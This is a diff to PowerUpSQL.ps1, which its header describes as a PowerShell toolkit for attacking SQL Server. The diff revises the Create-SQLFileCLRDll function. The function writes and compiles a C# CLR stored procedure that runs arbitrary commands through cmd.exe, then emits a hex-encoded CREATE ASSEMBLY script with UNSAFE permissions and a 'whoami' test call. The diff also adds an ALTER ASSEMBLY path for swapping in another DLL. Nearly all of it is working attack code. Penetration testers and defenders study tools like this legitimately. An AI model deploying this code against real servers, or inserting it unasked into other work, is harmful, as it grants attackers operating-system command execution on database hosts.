@@ -3,7 +3,7 @@
         File: PowerUpSQL.ps1
         Author: Scott Sutherland (@_nullbind), NetSPI - 2016
         Major Contributors: Antti Rantasaari and Eric Gruber
-        Version: 1.0.0.87
+        Version: 1.0.0.88
         Description: PowerUpSQL is a PowerShell toolkit for attacking SQL Server.
         License: BSD 3-Clause
         Required Dependencies: PowerShell v.2
@@ -10418,22 +10418,19 @@ function Create-SQLFileCLRDll
 {
     <#
             .SYNOPSIS
-            This script can be used to create a CLR DLL to execute OS commands through SQL Server.  It will
-            also generate a CREATE ASSEMBLY command that can be used to create an assembly and function without
-            requiring the DLL.
+            This script can be used to create a CLR DLL to execute OS commands through SQL Server. It provides the option to set a custom procedure name. 
+            By default, it will also create a file containing a "CREATE ASSEMBLY" TSQL command that can be used to create an assembly and function without
+            requiring the DLL.  Finally, an the function can be used to convert an existing CRL DLL ascii hex so it can be used
+            to register the assembly without the DLL.
             .NOTES
             https://msdn.microsoft.com/en-us/library/microsoft.sqlserver.server.sqlpipe.sendresultsrow(v=vs.110).aspx
             http://sekirkity.com/seeclrly-fileless-sql-server-clr-based-custom-stored-procedure-command-execution/
             https://msdn.microsoft.com/en-us/library/ms254498(v=vs.110).aspx
+            https://docs.microsoft.com/en-us/sql/t-sql/statements/alter-assembly-transact-sql
     #>
 
     [CmdletBinding()]
     Param(
-
-        [Parameter(Mandatory = $false,
-        HelpMessage = 'Operating system command to run.')]
-        [string]$Command,
-
         [Parameter(Mandatory = $false,
         HelpMessage = 'Procedure name.')]
         [string]$ProcedureName = "cmd_exec",  
@@ -10443,8 +10440,12 @@ function Create-SQLFileCLRDll
         [string]$OutDir = $env:temp,  
 
         [Parameter(Mandatory = $false,
-        HelpMessage = 'Output file name.')]
-        [string]$OutFile = "CLRFile"              
+        HelpMessage = 'Output name.')]
+        [string]$OutFile = "CLRFile",
+        
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Optional source DLL to convert to ascii hex.')]
+        [string]$SourceDllPath
     )
 
     Begin
@@ -10456,106 +10457,141 @@ function Create-SQLFileCLRDll
         $SRCPath = $OutDir + '\' + $OutFile + '.csc'
         $DllPath = $OutDir + '\' + $OutFile + '.dll'
         $CommandPath = $OutDir + '\' + $OutFile + '.txt'
+
+        # Change source DLL to existing DLL if provided
+        if($SourceDllPath){
+            $DllPath = $SourceDllPath
+            $SRCPath = "NA"
+        }
     }
 
     Process 
     {
 
-        # Create c# teamplate that will run any provided command
-        # Based on template from http://sekirkity.com/seeclrly-fileless-sql-server-clr-based-custom-stored-procedure-command-execution/
-        $TemplateCmdExec = @"
-        using System;
-        using System.Data;
-        using System.Data.SqlClient;
-        using System.Data.SqlTypes;
-        using Microsoft.SqlServer.Server;
-        using System.IO;
-        using System.Diagnostics;
-        using System.Text;
-        public partial class StoredProcedures
-        {
-        [Microsoft.SqlServer.Server.SqlProcedure]
-        public static void $ProcedureName (SqlString execCommand)
-        {
-        Process proc = new Process();
-        proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
-        proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand.Value);
-        proc.StartInfo.UseShellExecute = false;
-        proc.StartInfo.RedirectStandardOutput = true;
-        proc.Start();
+        # Status the user
+        Write-Verbose "Target C#  File: $SRCPath" 
+        Write-Verbose "Target DLL File: $DllPath" 
 
-            // Create the record and specify the metadata for the columns.
-	        SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));
+        if (-not $SourceDllPath){
+            # Create c# teamplate that will run any provided command
+            # Based on template from http://sekirkity.com/seeclrly-fileless-sql-server-clr-based-custom-stored-procedure-command-execution/
+            $TemplateCmdExec = @"
+            using System;
+            using System.Data;
+            using System.Data.SqlClient;
+            using System.Data.SqlTypes;
+            using Microsoft.SqlServer.Server;
+            using System.IO;
+            using System.Diagnostics;
+            using System.Text;
+            public partial class StoredProcedures
+            {
+            [Microsoft.SqlServer.Server.SqlProcedure]
+            public static void $ProcedureName (SqlString execCommand)
+            {
+            Process proc = new Process();
+            proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
+            proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand.Value);
+            proc.StartInfo.UseShellExecute = false;
+            proc.StartInfo.RedirectStandardOutput = true;
+            proc.Start();
 
-	        // Mark the begining of the result-set.
-	        SqlContext.Pipe.SendResultsStart(record);
+                // Create the record and specify the metadata for the columns.
+	            SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));
 
-            // Set values for each column in the row
-	        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
+	            // Mark the begining of the result-set.
+	            SqlContext.Pipe.SendResultsStart(record);
 
-	        // Send the row back to the client.
-	        SqlContext.Pipe.SendResultsRow(record);
+                // Set values for each column in the row
+	            record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
 
-	        // Mark the end of the result-set.
-	        SqlContext.Pipe.SendResultsEnd();
+	            // Send the row back to the client.
+	            SqlContext.Pipe.SendResultsRow(record);
 
-        proc.WaitForExit();
-        proc.Close();
+	            // Mark the end of the result-set.
+	            SqlContext.Pipe.SendResultsEnd();
 
-        }
-        };
+            proc.WaitForExit();
+            proc.Close();
+
+            }
+            };
 "@
 
-        # Setup output file paths
-        Write-Verbose "Writing source code to $SRCPath" 
-        $TemplateCmdExec | Out-File $SRCPath
+            # Write out the cs code
+            Write-Verbose "Writing C# code to $SRCPath" 
+            $TemplateCmdExec | Out-File $SRCPath
 
-        # Identify csc path
-        Write-Verbose "Locating csc.exe" 
-        $CSCPath = Get-ChildItem -Recurse "C:\Windows\Microsoft.NET\" -Filter "csc.exe" | Sort-Object fullname -Descending | Select-Object fullname -First 1 -ExpandProperty fullname
-        if(-not $CSCPath){
-            Write-Output "No csc.exe found."
-            return
+            # Identify csc path
+            Write-Verbose "Searching for csc.exe..." 
+            $CSCPath = Get-ChildItem -Recurse "C:\Windows\Microsoft.NET\" -Filter "csc.exe" | Sort-Object fullname -Descending | Select-Object fullname -First 1 -ExpandProperty fullname
+            if(-not $CSCPath){
+                Write-Output "No csc.exe found."
+                return
+            }else{
+                Write-Verbose "csc.exe found."
+            }
+            
+            $CurrentDirectory = pwd
+            cd $OutDir
+            $Command = "$CSCPath /target:library " + $SRCPath                   
+            # write-verbose "CSC Command: $Command"
+            Write-Verbose "Compiling to dll..."
+            $Results = Invoke-Expression $Command
+            cd $CurrentDirectory
         }
-
-        # Compile binary
-	$CurrentDirectory = pwd
-	cd $OutDir
-        $Command = "$CSCPath /target:library " + $SRCPath        
-        Write-Verbose "Compiling $SRCPath to $DllPath" 
-        write-verbose "Command: $Command"
-        $Results = Invoke-Expression $Command
-	cd $CurrentDirectory
-
+        
         # Read and encode file
         Write-Verbose "Grabbing bytes from the dll" 
-        $stringBuilder = New-Object -Type System.Text.StringBuilder
-        $stringBuilder.Append("create assembly [") > $null
-        $stringBuilder.Append($ProcedureName) > $null
-        $stringBuilder.Append("] AUTHORIZATION [dbo] from `n0x") > $null
-        $assemblyFile = resolve-path $DllPath
-        $fileStream = [IO.File]::OpenRead($assemblyFile)
-         while (($byte = $fileStream.ReadByte()) -gt -1) {
-            $stringBuilder.Append($byte.ToString("X2")) > $null
+        if (-not $SourceDllPath){
+
+            # write from default file
+            $stringBuilder = New-Object -Type System.Text.StringBuilder
+            $stringBuilder.Append("CREATE ASSEMBLY [") > $null
+            $stringBuilder.Append($ProcedureName) > $null
+            $stringBuilder.Append("] AUTHORIZATION [dbo] FROM `n0x") > $null
+            $assemblyFile = resolve-path $DllPath
+            $fileStream = [IO.File]::OpenRead($assemblyFile)
+             while (($byte = $fileStream.ReadByte()) -gt -1) {
+                $stringBuilder.Append($byte.ToString("X2")) > $null
+            }
+            $null = $stringBuilder.AppendLine("`nWITH PERMISSION_SET = UNSAFE")
+            $null = $stringBuilder.AppendLine("GO")
+            $null = $stringBuilder.AppendLine("CREATE PROCEDURE [dbo].[$ProcedureName] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [$ProcedureName].[StoredProcedures].[$ProcedureName];")
+            $null = $stringBuilder.AppendLine("GO")
+            $null = $stringBuilder.AppendLine("EXEC[dbo].[$ProcedureName] 'whoami'")        
+            $null = $stringBuilder.AppendLine("GO")
+            $MySQLCommand = $stringBuilder.ToString() -join ""
+            $fileStream.Close()
+            $fileStream.Dispose()
+        }else{
+            
+            # write from provided file
+            $stringBuilder = New-Object -Type System.Text.StringBuilder
+            $null = $stringBuilder.AppendLine("-- Change the assembly name to the one you want to replace")  
+            $null = $stringBuilder.AppendLine("ALTER ASSEMBLY [TBD] FROM")
+            $null = $stringBuilder.Append("`n0x") 
+            $assemblyFile = resolve-path $DllPath
+            $fileStream = [IO.File]::OpenRead($assemblyFile)
+             while (($byte = $fileStream.ReadByte()) -gt -1) {
+                $stringBuilder.Append($byte.ToString("X2")) > $null
+            }
+            $null = $stringBuilder.AppendLine("`nWITH PERMISSION_SET = UNSAFE")
+            $null = $stringBuilder.Append("")
+            $MySQLCommand = $stringBuilder.ToString() -join ""
+            $fileStream.Close()
+            $fileStream.Dispose()
+
         }
-        $stringBuilder.Append("`n with permission_set = UNSAFE")
-        $stringBuilder.Append(" GO")
-        $stringBuilder.Append(" CREATE PROCEDURE [dbo].[$ProcedureName] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [$ProcedureName].[StoredProcedures].[$ProcedureName];")
-        $stringBuilder.Append(" GO")
-        $stringBuilder.Append(" EXEC[dbo].[cmd_exec] 'whoami'")        
-        $stringBuilder.Append(" GO")
-        $MySQLCommand = $stringBuilder.ToString() -join ""
-        $fileStream.Close()
-        $fileStream.Dispose()
 
         # Generate SQL Command - note: this needs to be join together to work
-        Write-Verbose "Writing CREATE ASSEMBLY command using DLL bytes to $CommandPath"
+        Write-Verbose "Writing SQL to: $CommandPath"
         $MySQLCommand | Out-File $CommandPath 
 
         # Status user
-        Write-Output "Source: $SRCPath"
-        Write-Output "DLL: $DllPath"
-        Write-Output "SQL Command: $CommandPath"
+        Write-Output "C# File: $SRCPath"
+        Write-Output "CLR DLL: $DllPath"
+        Write-Output "SQL Cmd: $CommandPath"        
     }
     
     End 
